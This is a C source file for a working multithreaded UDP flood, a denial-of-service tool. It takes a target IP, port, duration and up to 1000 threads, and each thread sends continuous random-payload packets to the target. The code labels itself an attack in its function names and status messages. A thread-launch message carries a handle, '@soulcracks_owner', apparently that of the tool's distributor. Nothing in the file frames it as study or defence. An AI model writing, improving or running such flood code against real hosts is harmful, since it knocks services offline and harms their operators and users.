#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdint.h>


#define DEFAULT_PACKET_SIZE 512


struct thread_data {
    char *target_ip;
    int target_port;
    int duration;
};


struct rng_state {
    uint64_t state;
};


static inline uint64_t fast_rand(struct rng_state *rng) {
    uint64_t x = rng->state;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    rng->state = x;
    return x;
}


static inline void init_rng(struct rng_state *rng, int thread_id) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    rng->state = ts.tv_nsec ^ (ts.tv_sec << 32) ^ ((uint64_t)thread_id << 48);
    if (rng->state == 0) rng->state = 1;
}


static inline void fill_random_data(uint8_t *buffer, int size, struct rng_state *rng) {
    uint64_t *buf64 = (uint64_t *)buffer;
    int i;
    

    for (i = 0; i < size / 8; i++) {
        buf64[i] = fast_rand(rng);
    }
    

    uint8_t *buf8 = (uint8_t *)&buf64[i];
    int remaining = size - ((size / 8) * 8);
    for (i = 0; i < remaining; i++) {
        buf8[i] = (uint8_t)fast_rand(rng);
    }
}


void *attack_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct rng_state rng;
    int sockfd;
    struct sockaddr_in dest_addr;
    time_t end_time;
    unsigned long long packets_sent = 0;
    uint8_t *payload;
    

    init_rng(&rng, (int)pthread_self());
    

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    

    payload = malloc(DEFAULT_PACKET_SIZE);
    if (!payload) {
        perror("malloc failed");
        close(sockfd);
        pthread_exit(NULL);
    }
    

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    dest_addr.sin_addr.s_addr = inet_addr(data->target_ip);
    

    end_time = time(NULL) + data->duration;
    

    while (time(NULL) <= end_time) {
        // Generate random payload for each packet
        fill_random_data(payload, DEFAULT_PACKET_SIZE, &rng);
        
        // Send packet
        if (sendto(sockfd, payload, DEFAULT_PACKET_SIZE, 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {

                if (packets_sent == 0) {
                    perror("sendto failed");
                    break;
                }
            }
        } else {
            packets_sent++;
        }
    }
    
    free(payload);
    close(sockfd);
    
    printf("Thread %lu finished: %llu packets sent\n", pthread_self(), packets_sent);
    pthread_exit(NULL);
}


void usage(const char *prog) {
    printf("Usage: %s ip port time threads\n", prog);
    exit(1);
}


int main(int argc, char *argv[]) {
    // Check command line arguments
    if (argc != 5) {
        usage(argv[0]);
    }
    

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Error: Invalid port number (must be 1-65535)\n");
        exit(1);
    }
    
    if (duration <= 0 || duration > 3600) {
        fprintf(stderr, "Error: Invalid duration (must be 1-3600 seconds)\n");
        exit(1);
    }
    
    if (num_threads <= 0 || num_threads > 1000) {
        fprintf(stderr, "Error: Invalid thread count (must be 1-1000)\n");
        exit(1);
    }
    

    struct in_addr addr;
    if (inet_aton(target_ip, &addr) == 0) {
        fprintf(stderr, "Error: Invalid IP address\n");
        exit(1);
    }
    

    struct thread_data data = {
        .target_ip = target_ip,
        .target_port = target_port,
        .duration = duration
    };
    

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    if (!threads) {
        perror("Failed to allocate thread array");
        exit(1);
    }
    

    printf("Attack started on %s:%d for %d seconds with %d threads\n",
           target_ip, target_port, duration, num_threads);
    

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, (void *)&data) != 0) {
            perror("Thread creation failed");

            for (int j = 0; j < i; j++) {
                pthread_cancel(threads[j]);
            }
            free(threads);
            exit(1);
        }
        printf("Launched thread with ID: @soulcracks_owner> %lu\n", threads[i]);
    }
    

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    printf("Attack finished join \n");
    
    return 0;
}
